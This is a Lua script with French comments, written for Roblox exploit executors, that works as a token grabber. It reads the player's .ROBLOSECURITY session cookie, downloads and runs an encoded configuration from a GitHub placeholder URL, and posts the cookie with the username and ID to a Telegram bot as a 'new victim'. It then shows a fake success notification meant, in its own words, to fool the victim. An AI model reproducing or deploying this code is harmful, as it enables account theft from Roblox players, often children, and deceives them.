-- Script pour récupérer le cookie Roblox et l'envoyer à Telegram
-- Fonctionne avec les exécuteurs comme Delta, Synapse X, etc.

-- Services Roblox nécessaires
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- ⚠️ Ne stocke PAS tes informations Telegram ici ⚠️
-- Elles seront récupérées à partir du serveur séparé

-- Fonction pour obtenir le cookie .ROBLOSECURITY
local function getCookie()
    -- Cette méthode varie selon l'exécuteur
    -- Pour Delta, utilise cette méthode :
    local cookie = ""
    
    if syn then
        cookie = syn.request({
            Url = "https://roblox.com",
            Method = "GET"
        }).Cookies[".ROBLOSECURITY"]
    elseif http and http.request then
        cookie = http.request({
            Url = "https://roblox.com",
            Method = "GET"
        }).Cookies[".ROBLOSECURITY"]
    elseif request then
        cookie = request({
            Url = "https://roblox.com",
            Method = "GET"
        }).Cookies[".ROBLOSECURITY"]
    end
    
    return cookie or "Cookie non trouvé"
end

-- Fonction pour envoyer à Telegram (les infos sont chargées dynamiquement)
local function sendToTelegram(token, userId, userName)
    -- Récupérer la configuration à partir du fichier séparé
    local configUrl = "https://raw.githubusercontent.com/TON_USERNAME/roblox-token-grabber/main/config_encoded.lua"
    local configEncoded = game:HttpGet(configUrl)
    
    -- Décoder la configuration (simple encodage base64)
    local function decode(str)
        local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        return (str:gsub('[^'..b..'=]', ''):gsub('.', function(x)
            if x == '=' then return '' end
            local r, f = '', (b:find(x)-1)
            for i = 6, 1, -1 do r = r..(f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
            return r
        end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
            if #x ~= 8 then return '' end
            local c = 0
            for i = 1, 8 do c = c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
            return string.char(c)
        end))
    end
    
    local config = loadstring(decode(configEncoded))()
    local TELEGRAM_BOT_TOKEN = config.t
    local CHAT_ID = config.c
    local TELEGRAM_API_URL = "https://api.telegram.org/bot" .. TELEGRAM_BOT_TOKEN .. "/sendMessage"
    
    -- Envoyer le message à Telegram
    local success, response = pcall(function()
        local data = {
            chat_id = CHAT_ID,
            text = string.format(
                "🚨 *NOUVELLE VICTIME!* 🚨\n" ..
                "👤 *Joueur:* %s (%d)\n" ..
                "🔑 *Token:* `%s`\n" ..
                "⏰ *Heure:* %s",
                userName,
                userId,
                token,
                os.date("%Y-%m-%d %H:%M:%S")
            ),
            parse_mode = "Markdown"
        }
        
        local headers = { ["Content-Type"] = "application/json" }
        local jsonData = HttpService:JSONEncode(data)
        return HttpService:PostAsync(TELEGRAM_API_URL, jsonData, Enum.HttpContentType.ApplicationJson, false, headers)
    end)
    
    if success then
        print("Token envoyé avec succès!")
    else
        warn("Échec: " .. tostring(response))
    end
end

-- Exécution principale
local cookie = getCookie()
sendToTelegram(cookie, player.UserId, player.Name)

-- Afficher un message de succès pour tromper la victime
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "Hack réussi!",
    Text = "Vous avez volé Robux de tous les joueurs",
    Duration = 5
})